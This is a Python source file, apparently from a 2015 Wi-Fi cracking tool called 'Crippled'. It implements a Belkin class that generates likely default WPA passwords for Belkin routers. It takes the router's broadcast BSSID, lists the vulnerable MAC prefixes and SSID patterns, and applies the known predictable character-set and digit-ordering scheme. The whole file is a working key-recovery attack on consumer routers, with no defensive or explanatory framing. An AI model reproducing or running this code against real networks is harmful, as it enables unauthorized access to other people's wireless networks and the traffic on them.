#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: binary -*-

# This file is part of Crippled.
# 2015 - GuerrillaWarfare - https://twitter.com/GuerrillaWF
# Key generation last update on [2015-05-12]

class BelkinRuntimeError(RuntimeError):
    """Custom Belkin RuntimeError messages."""
    pass

class Belkin(object):

    # Character sets.
    __CHARSET  = '024613578ACE9BDF'
    __charset  = '944626378ace9bdf'
    __charsets = [__CHARSET, __charset]

    # Predictable value orders.
    __ORDER_0  = [6,2,3,8,5,1,7,4]
    __ORDER_1  = [1,2,3,8,5,1,7,4]
    __ORDER_2  = [1,2,3,8,5,6,7,4]
    __ORDER_3  = [6,2,3,8,5,6,7,4]
    __orders   = [__ORDER_0, __ORDER_1, __ORDER_2]

    def __init__(self):
        self.__KEYS     = [] # To hold all possibly generated keys.

        # Vulnerable MACs
        self.__targets  = ['94:44:52','08:86:3B','EC:1A:59']
        # Vulnerable AP names.
        self.__essids   = ['Belkin.XXXX','Belkin_XXXXXX','belkin.xxxx','belkin.xxx']

    def generatekey(self, wmac, charset=__charset, order=__ORDER_0):
        k = ''.join([wmac[order[i]-1] for i in xrange(len(wmac))])
        return ''.join([charset[int(c,16)] for c in k])

    def increment(self, bssid):
        return "%012X" %(int(bssid,16)+1)

    def possibilities(self, essid, bssid):
        bssid = bssid.replace(":", '') # the BSSID has to be in a certain form for proper key generation.
        if essid.startswith('B'): # CHARSET-macwifi
            self.__KEYS.append(self.generatekey(bssid[4:],self.__CHARSET))

        elif essid.startswith('b'): # charset-wanmac
            mac = self.increment(bssid)

            if (mac.startswith('944452')):
                self.__KEYS.append(self.generatekey(mac[4:], self.__charset))
            else:
                ''' special case: charset-wanmac != order &&  charset-wanmac+1 '''
                for i in xrange(3):
                    for c in self.__charsets:
                        for o in self.__orders:
                            self.__KEYS.append(self.generatekey(bssid[4:], c, o))
                    #mac = self.increment(bssid)
                self.__KEYS.append(self.generatekey(mac[4:], self.__charset))
                self.__KEYS.append(self.generatekey(mac[4:], self.__charset, self.__ORDER_2))
                mac = self.increment(bssid)
                self.__KEYS.append(self.generatekey(mac[4:], self.__charset))
        u = {}
        for key in self.__KEYS:
            u[key] = 1
        return u.keys() # To ensure that no duplicates will be used.
